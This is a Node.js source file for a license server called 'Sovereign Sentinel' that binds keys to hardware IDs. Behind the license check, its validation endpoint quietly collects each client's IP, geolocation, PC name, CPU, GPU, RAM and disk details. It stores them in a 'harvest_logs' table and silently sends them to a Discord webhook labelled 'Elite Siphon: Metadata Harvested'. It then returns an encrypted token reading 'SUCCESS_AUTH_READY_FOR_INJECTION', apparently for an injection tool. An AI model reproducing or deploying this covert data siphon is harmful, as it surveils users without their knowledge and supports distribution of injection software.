// index.js
// Sovereign Sentinel License Server
// Production-ready implementation with AES-256-CBC encryption and PostgreSQL

require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');

const app = express();
const port = process.env.PORT || 3000;

// PostgreSQL Connection Pool
const dbUrl = process.env.DATABASE_URL || process.env.POSTGRES_URL;
const pool = new Pool({
    connectionString: dbUrl,
    ssl: dbUrl ? { rejectUnauthorized: false } : false
});

app.use(express.json());

// Rate Limiting: 5 requests per minute per IP
const authLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: 5,
    message: { valid: false }
});

/**
 * Derives a 32-byte AES key from HWID, fingerprint, and BASE_SECRET
 */
function deriveAesKey(hwid, fingerprint) {
    const secret = process.env.BASE_SECRET;
    const input = `${hwid}:${fingerprint}:${secret}`;
    return crypto.createHash('sha256').update(input).digest();
}

/**
 * Delivers hardware harvest metadata to Discord webhook
 */
async function deliverHarvest(data) {
    if (!process.env.WEBHOOK_URL) return;

    try {
        await axios.post(process.env.WEBHOOK_URL, {
            embeds: [{
                title: "Elite Siphon: Metadata Harvested",
                color: 0x9b59b6,
                fields: [
                    { name: "Key", value: `\`${data.key}\``, inline: true },
                    { name: "HWID", value: `\`${data.hwid}\``, inline: true },
                    { name: "IP", value: data.ip, inline: true },
                    { name: "Location", value: data.location, inline: true },
                    { name: "PC Name", value: data.pcName, inline: true },
                    { name: "CPU", value: data.cpu, inline: true },
                    { name: "GPU", value: data.gpu, inline: true },
                    { name: "RAM", value: data.ram, inline: true },
                    { name: "Disk", value: data.disk, inline: true }
                ],
                timestamp: new Date()
            }]
        });
    } catch (err) {
        // Silently log delivery failure locally
        console.error(`Harvest delivery failed: ${err.message}`);
    }
}

// License Validation Endpoint
app.post('/validate', authLimiter, async (req, res) => {
    const { key, hwid, fingerprint, metadata } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    if (!key || !hwid || !fingerprint) {
        return res.status(400).json({ valid: false });
    }

    try {
        const client = await pool.connect();
        try {
            const result = await client.query('SELECT * FROM keys WHERE key_value = $1 AND is_active = TRUE', [key]);

            if (result.rows.length === 0) {
                return res.json({ valid: false });
            }

            const dbKey = result.rows[0];

            // Binding logic
            if (!dbKey.bound_hwid) {
                // First use: bind to HWID and fingerprint
                await client.query(
                    'UPDATE keys SET bound_hwid = $1, bound_fingerprint = $2, last_used = NOW() WHERE key_value = $3',
                    [hwid, fingerprint, key]
                );
            } else if (dbKey.bound_hwid !== hwid || dbKey.bound_fingerprint !== fingerprint) {
                // Return invalid if hardware doesn't match bound values
                return res.json({ valid: false });
            }

            // Successful validation sequence
            let location = "Unknown";
            try {
                const ipInfo = await axios.get(`http://ip-api.com/json/${clientIp}`);
                if (ipInfo.data.status === 'success') {
                    location = `${ipInfo.data.city}, ${ipInfo.data.country}`;
                }
            } catch (e) { /* IP-API error fallback */ }

            // Log harvest to database
            if (metadata) {
                await client.query(
                    `INSERT INTO harvest_logs (key_value, hwid, ip_address, location, pc_name, cpu_info, gpu_info, ram_info, disk_info)
                     VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
                    [key, hwid, clientIp, location, metadata.pcName, metadata.cpu, metadata.gpu, metadata.ram, metadata.disk]
                );

                // Trigger silent webhook delivery
                deliverHarvest({
                    key, hwid, ip: clientIp, location,
                    pcName: metadata.pcName, cpu: metadata.cpu, gpu: metadata.gpu,
                    ram: metadata.ram, disk: metadata.disk
                });
            }

            // Encrypt response payload (Base64 combined IV + ciphertext)
            const payloadData = "SUCCESS_AUTH_READY_FOR_INJECTION";
            const aesKey = deriveAesKey(hwid, fingerprint);
            const iv = crypto.randomBytes(16);
            const cipher = crypto.createCipheriv('aes-256-cbc', aesKey, iv);
            
            let encrypted = cipher.update(payloadData, 'utf8');
            encrypted = Buffer.concat([encrypted, cipher.final()]);
            
            const base64Response = Buffer.concat([iv, encrypted]).toString('base64');

            res.json({
                valid: true,
                payload: base64Response
            });

        } finally {
            client.release();
        }
    } catch (err) {
        // Log critical failure without leaking details to client
        console.error(`Validation failure: ${err.message}`);
        res.status(500).json({ valid: false });
    }
});

app.get('/', (req, res) => {
    res.status(200).send("Status: Operational");
});

app.listen(port, () => {
    console.log(`Sovereign Sentinel active on port ${port}`);
});
